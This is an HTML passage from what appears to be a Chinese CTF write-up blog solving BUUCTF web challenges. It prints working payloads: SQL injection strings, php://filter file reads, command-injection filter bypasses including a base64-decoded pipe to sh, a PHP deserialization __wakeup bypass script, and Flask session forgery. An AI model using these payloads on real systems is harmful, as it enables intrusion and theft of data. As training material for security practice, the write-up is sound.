class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解题相关知识</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置</span><br><span class="line"><span class="comment">// mb_strpos (haystack ,needle )</span></span><br><span class="line"><span class="comment">// haystack：要被检查的字符串。</span></span><br><span class="line"><span class="comment">// needle：要搜索的字符串</span></span><br><span class="line">**mb_substr()** 函数返回字符串的一部分。</span><br><span class="line"><span class="comment">//str 必需。从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">//start 必需。规定在字符串的何处开始。</span></span><br><span class="line"><span class="comment">//ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾</span></span><br><span class="line">request()<span class="comment">//可以以get或者post提交参数</span></span><br><span class="line"><span class="keyword">include</span> <span class="comment">//文件包含</span></span><br><span class="line"><span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span><span class="comment">//将$_page后拼接.</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">&amp;&amp; <span class="title">emmm</span>::<span class="title">checkFile</span>(<span class="params"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function">上面这代码表示 将<span class="title">request</span>的<span class="title">file</span>值 传入$<span class="title">page</span>，其实就是将<span class="title">file</span>参数传入到<span class="title">page</span>中</span></span><br><span class="line"><span class="function">&amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如：</span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">foo</span> (<span class="params">&amp;<span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123; <span class="variable">$var</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="number">5</span>;</span><br><span class="line">foo (<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">将使 <span class="variable">$a</span> 变成 <span class="number">6</span>。这是因为在 foo 函数中变量 <span class="variable">$var</span> 指向了和 <span class="variable">$a</span> 指向的同一个内容。</span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>过滤</p><p><code>select|update|delete|drop|insert|where</code></p><p>绕过，考虑报错注入</p><p><code>1&#39; and extractvalue(1,concat(&#39;~&#39;,database()))%23</code></p><p>但很多关键字被过滤，考虑堆叠注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27;;use supersqli;show tables;#</span></span><br><span class="line"><span class="string">-1&#x27;</span>;<span class="keyword">use</span> <span class="title">supersqli</span>;show columns <span class="keyword">from</span> `<span class="number">1919810931114514</span>`;<span class="comment">#</span></span><br><span class="line">-<span class="number">1</span><span class="string">&#x27;;use supersqli;set @sql=concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect `flag` <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>核心思路</p><p><code>set sql_mode=pipes_as_concat;</code></p><p>Payload:</p><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码</p><p><code>check.php?username=admin%27or+1%3D1+%23&amp;password=dawd</code></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>一路点，抓包在302页面找到secr3t.php，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用file=php://filter/convert.base64-encode/resource=flag.php来读就好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">&quot;background-color:black;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;我就在这里&quot;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;56d32da4-1a02-4eb1-a01f-c140abc88a4b&#125;&#x27;</span>;</span><br><span class="line">                <span class="variable">$secret</span> = <span class="string">&#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style=<span class="string">&quot;background-color:black;&quot;</span>&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style=<span class="string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style=<span class="string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br><span class="line">            <span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;我就在这里&quot;</span>;</span><br><span class="line">                <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;56d32da4-1a02-4eb1-a01f-c140abc88a4b&#125;&#x27;</span>;</span><br><span class="line">                <span class="variable">$secret</span> = <span class="string">&#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span></span><br><span class="line">            <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>tornado的cookie_secret文档</p><p><a href="https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret">https://www.tornadoweb.org/en/latest/guide/security.html?highlight=cookie_secret</a></p><p>当MainHandler传递值时，会创建一个名叫settings的dict，而cookie_secret就在里面。并且，settings会随着MainHandler传递到前端去。即可以在handler.settings中找到cookie_secret的值，然后跟着它的hint做就可以了</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><code>php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>order%<span class="number">20</span>by%<span class="number">204</span>%<span class="number">23</span> 注出只有<span class="number">3</span>个字段</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span> 找到显位<span class="number">2</span>和<span class="number">3</span></span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,database(),<span class="number">3</span>%<span class="number">23</span> 数据库名geek</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(table_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span>where%<span class="number">20</span>table_schema=%<span class="number">27</span>geek%<span class="number">27</span>),<span class="number">3</span>%<span class="number">23</span> 表名geekuser,l0ve1ysq1</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=%<span class="number">27</span>geek%<span class="number">27</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=%<span class="number">27</span>l0ve1ysq1%<span class="number">27</span>),<span class="number">3</span>%<span class="number">23</span> 字段名id,username,password</span><br><span class="line">username=admin&amp;password=<span class="number">1</span>%<span class="number">27</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,(select%<span class="number">20</span>group_concat(username,%<span class="number">200</span>x5e,%<span class="number">20</span>password)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>geek.l0ve1ysq1),<span class="number">3</span>%<span class="number">23</span> 获取字段内容，然后找到flag</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST会将某些字符删除或用下划线代替，如%20news[id%00=42会转换为Array([news_id] =&gt; 42)</p><p>过滤了&quot;&#39;，用chr()绕过%20num=var_dump(scandir(chr(47)))得到列表</p><p>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))得到flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>过滤空格绕过方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br></pre></td></tr></table></figure><p>这题的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">22</span>|<span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh</span><br><span class="line">?ip=<span class="number">22</span>|ls|xargs$IFS$<span class="number">1</span>cat</span><br><span class="line">?ip=<span class="number">22</span>|cat$IFS$<span class="number">1</span>`ls`</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>POST：Syc=var_dump(file_get_contents(&#39;/flag&#39;));</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>ss|cat /flag</p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>反序列化务必使用python来看，绕过__wakeup函数只用把表示属性个数的值改大就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1/www/111.php&quot;</span>)</span><br><span class="line"><span class="keyword">print</span>(repr(resp.text))</span><br><span class="line"><span class="comment"># O:4:&quot;Name&quot;:2:&#123;s:14:&quot;\x00Name\x00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\x00Name\x00password&quot;;i:100;&#125;</span></span><br><span class="line">xx = <span class="string">&#x27;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\x00Name\x00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\x00Name\x00password&quot;;i:100;&#125;&#x27;</span></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://96d1b3c9-16f6-44e8-a10e-bea5badd78c5.node3.buuoj.cn/?select=&quot;</span>+ xx)</span><br><span class="line"><span class="keyword">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>111.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//include &#x27;class.php&#x27;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username </span>= <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password </span>= <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa </span>= <span class="keyword">new</span> Name(<span class="string">&quot;admin&quot;</span>, <span class="number">100</span>);</span><br><span class="line">print_r(serialize(<span class="variable">$aa</span>));</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node3.buuoj.cn:<span class="number">26611</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Syclover/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="comment">Referer: https://www.Sycsecret.com</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br></pre></td></tr></table></figure><p>主要三个地方，一个Referer，一个XFF，一个改浏览器标识</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>做法1：Session伪造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span> 拿到secret_key</span><br></pre></td></tr></table></figure><p>利用github上一个开源项目伪造session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -s ckj123 -c <span class="string">&quot;.eJw9kMGKwkAQRH9lmbOHJOpF8KBMHBS6g2GSMH0R10STHtuFqKgR_32zLngu6vGqnmqzb6tzrSaX9loN1KYp1eSpvr7VRJFZNMB-hMVy6DhtsFt54COjJQ8mFzTZg-xhCDq-O4EO7LxBm0WOZxFEKaPEIXbQkeQe7ezmoj_OiqFYh2hLn-jUYwEPlIUQ50yyvqHGGjmvMcrGqLOQjAuIfYCSjVwUP0inApwf-y47W9bQoZC4qXoN1O7c7jeXH1-dPhMSs-yoQAZDNQkE1OslFm6JyY8Q9Wp6ziC5gIY7FfHY9Rqwnr5xjWwP1Ye00xQns__ktJU-UGEYqoG6nqv2_ZoKA_X6BbWIa8E.X4VwIA.Rkin6-MMArxsGd_I2z5Ub0AaWjg&quot;</span></span><br><span class="line">-s跟secret_key -c跟session</span><br><span class="line">解得&#123;<span class="string">&#x27;_fresh&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;_id&#x27;</span>: <span class="string">b&#x27;dab2985b7b4b72d29c56d0ef4e2e87011bc310b556b063dc6a5733fed500cb7b2c1d557d84d5c26aff5cfd043a65a7e9455df4f946e8ca2d4f25e84ca7a33fff&#x27;</span>, <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">b&#x27;8b3ecc0fafc4e569308ee3c3d0c2ef031ea9b5c1&#x27;</span>, <span class="string">&#x27;image&#x27;</span>: <span class="string">b&#x27;p6D8&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>: <span class="string">&#x27;10&#x27;</span>&#125;</span><br><span class="line">修改对应值为admin</span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s ckj123 -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;dab2985b7b4b72d29c56d0ef4e2e87011bc310b556b063dc6a5733fed500cb7b2c1d557d84d5c26aff5cfd043a65a7e9455df4f946e8ca2d4f25e84ca7a33fff&#x27;, &#x27;csrf_token&#x27;: b&#x27;8b3ecc0fafc4e569308ee3c3d0c2ef031ea9b5c1&#x27;, &#x27;image&#x27;: b&#x27;p6D8&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br><span class="line">加密得到.eJw9kMGKwkAQRH9lmbOHJOpF8KBMHBS6g2GSMH0R10STHtuFqKgR_32zLngu6vGqnmqzb6tzrSaX9loN1KYp1eSpvr7VRJFZNMB-hMVy6DhtsFt54COjJQ8mFzTZg-xhCDq-O4EO7LxBm0WOZxFEKaPEIXbQkeQe7ezmoj_OiqFYh2hLn-jUYwEPlIUQ50yyvqHGGjmvMcrGqLOQjAuIfYCSjVwUP0inApwf-y47W9bQoZC4qXoN1O7c7jeXH1-dPhMSs-yoQAZDNQkE1OslFm6JyY8Q9Wp6ziC5gIY7FfHY9Rqwnr5xjWwP1Ye00xQns__ktJU-UNtSmpMaqOu5at-_qTBQr1-f7W03.X4VxOQ.KRA69X0skFKOV_aVoNryiWVok1w</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>过滤了union select or from这些，复写绕过就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(schema_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.schemata%<span class="number">20</span>%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(table_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.tables%<span class="number">20</span>whwhereere%<span class="number">20</span>table_schema%<span class="number">3</span>Ddatabase()%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(column_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.columns%<span class="number">20</span>whwhereere%<span class="number">20</span>table_schema%<span class="number">3</span>Ddatabase()%<span class="number">20</span>anandd%<span class="number">20</span>table_name%<span class="number">3</span>D%<span class="number">27</span>b4bsql%<span class="number">27</span>%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(passwoorrd)%<span class="number">20</span>frfromom%<span class="number">20</span>b4bsql%<span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 